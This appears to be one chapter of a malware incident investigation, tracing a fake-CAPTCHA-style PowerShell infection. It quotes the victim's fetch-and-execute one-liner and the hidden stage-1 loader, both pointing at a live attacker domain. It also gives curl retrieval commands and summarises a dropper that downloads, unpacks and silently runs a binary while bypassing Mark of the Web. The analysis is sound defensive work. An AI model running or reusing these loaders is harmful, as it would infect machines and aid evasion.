# 01 — Initial access (verified against live infrastructure)

> This document supersedes the "kill chain" narrative from the initial written incident report the investigation started with. That report described a simpler mechanism (`file.php` / `get.php`, `IEX` + `WebClient`, archive password `ShahradR_Pass2026`) which, once checked directly against the live infrastructure with `curl`, **did not match reality** on several points. What follows is the verified version. See [`06-c2-infrastructure.md`](06-c2-infrastructure.md#discrepancy-with-the-initial-report) for the discrepancy list.

## How the infection started

The machine's owner was socially engineered into manually running the following command (exact delivery/lure page not captured by this investigation — this class of attack is commonly delivered via a fake CAPTCHA/"verify you're human" page instructing the victim to press Win+R and paste a command, a fake software crack, or a fake update prompt):

```powershell
powershell -c "$a=irm 'dragonphoenixstar.cfd/3MuK9PYWoflPRxG1';$h=@{ScriptBlock=[ScriptBlock]::Create($a);Name='s'};New-Module @h|Out-Null"
```

Two things worth noting about this specific one-liner, compared to a "plain" `IEX(...)` downloader:

- It uses `irm` (`Invoke-RestMethod`) to fetch the script text, then wraps it in a **PowerShell module** (`New-Module`) instead of directly `Invoke-Expression`-ing it. Running attacker code as a dynamically created module is a known technique to reduce the chances of triggering simple `IEX`/`DownloadString` detections.
- The URL path (`3MuK9PYWoflPRxG1`) is a **per-victim, single-use-looking token**, not a static file name — this is the C2 tracking which victim is fetching what, and makes it harder for a defender to just "download the payload" from a shared/generic URL later (in this case the token was still live hours later — see below).

## Stage 1 — reproduced independently on Linux

To verify what the command above actually fetched, the same URL was requested from the Debian analysis machine with `curl`, without ever running the returned content:

```bash
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -s "http://dragonphoenixstar.cfd/3MuK9PYWoflPRxG1" -o payload.txt
```

This returned an HTTP 301 (a generic Cloudflare redirect page) — the server does not serve the real payload to a generic browser User-Agent. Retrying with a User-Agent string that includes `WindowsPowerShell/5.1` succeeded:

```bash
curl -s -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; WindowsPowerShell/5.1)" "http://dragonphoenixstar.cfd/3MuK9PYWoflPRxG1" -o payload.txt
```

Result (full content, see [`../stages/stage1_loader.ps1`](../stages/stage1_loader.ps1)):

```powershell
Start-Process powershell -ArgumentList '-NoP -Exec Bypass -Command "$a=irm ''dragonphoenixstar.cfd/1YLO2qTafmdBm3CqwH'';$h=@{ScriptBlock=[ScriptBlock]::Create($a);Name=''c''};New-Module @h|Out-Null;exit"' -WindowStyle Hidden
```

This spawns a second, hidden PowerShell process that repeats the same "fetch as module" pattern against a **second, different per-victim token URL** (`dragonphoenixstar.cfd/1YLO2qTafmdBm3CqwH`).

## Stage 2 — the actual dropper

Fetching that second URL (same User-Agent requirement) returned the real dropper logic — see the full, unmodified script at [`../stages/stage2_dropper.ps1`](../stages/stage2_dropper.ps1). Summary of what it does, in order:

1. Computes a few unused GUID-derived "jitter" variables (`$DSfyHa`, `$cPoCYg`, `$njsODe`) — junk/dead code, likely there purely as static-signature noise (the same "junk code" theme shows up inside the compiled binary too, see [`02-static-analysis.md`](02-static-analysis.md)).
2. Sets `$env:SEE_MASK_NOZONECHECKS = 1` — disables the Windows "Mark of the Web" zone-check warning that would normally appear when opening a file downloaded from the internet.
3. Defines `FetchSTHAS`, a resilient downloader function: retries up to twice, uses `WebClient` first and falls back to `Invoke-WebRequest`, sends a custom header `X-Panel-Internal: 1` on every request, and validates the downloaded file by its magic bytes (`4D 5A` / "MZ" for a PE, `37 7A` for a 7z archive) before trusting it.
4. Downloads the actual malicious archive from `sillygoosetoon.cfd/dl/689838.7z` (HTTPS, falling back to HTTP) to a random-GUID-named `.7z` file in `%TEMP%`.
5. Looks for a system-installed 7-Zip (`C:\Program Files\7-Zip\7z.exe` or the x86 path); if absent, downloads a portable `7z.exe` from one of three mirrors (`91.92.33.156/t/7z.exe`, `dragonphoenixstar.cfd/t/7z.exe` over HTTP and HTTPS).
6. Extracts the archive with password **`10000`** (not `ShahradR_Pass2026` as the initial report claimed) into `%TEMP%\<guid>.7z_x`.
7. Finds the first `.exe` inside the extracted folder, calls `Unblock-File` on it (removes the Mark-of-the-Web flag so Windows SmartScreen won't warn on launch), and starts it hidden (`-WindowStyle Hidden`).
8. Writes the infection marker: `Set-Content (Join-Path $env:TEMP 'rx_unpack.ok') '1'` — this is the exact file the initial report vaguely described as "a marker file with `.ok` extension." Its real, full name is **`rx_unpack.ok`** in `%TEMP%`.
9. Fires two network calls back to the attacker's infrastructure — a GET "delivery callback" and a POST "beacon" to the C2 panel. Full detail in [`06-c2-infrastructure.md`](06-c2-infrastructure.md).

From this point on, `shahradr.exe` (renamed on disk from whatever the archive contained) is running — see [`02-static-analysis.md`](02-static-analysis.md) onward for what happens inside the binary itself.
